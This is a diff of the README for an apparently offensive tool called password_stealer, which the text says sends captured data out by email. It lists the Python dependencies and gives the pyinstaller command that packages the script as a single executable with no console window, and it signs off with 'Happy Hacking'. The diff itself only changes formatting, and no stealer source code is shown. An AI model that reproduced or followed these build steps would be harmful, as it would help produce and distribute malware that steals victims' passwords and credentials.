@@ -8,29 +8,28 @@ receive data by email
 
 download and install Python > 3.0
 
-after install Python,open your cmd and install Dependencies
+# after install Python,open your cmd and install Dependencies
 
-pip install pywin32
+ pip install pywin32
 
-pip install Pillow
+ pip install Pillow
 
-pip install requests
+ pip install requests
 
 pip install cryptography
 
 pip install pyinstaller
 
 
-to build with .exe ,run :
+# to build with .exe ,run :
 
 pyinstaller password_stealer.py -F -w
 
 
-password_stealer is your file python,you can change the name
+# password_stealer is your file python,you can change the name
 
 
 # Happy Hacking
-
 
 # Contact 
 
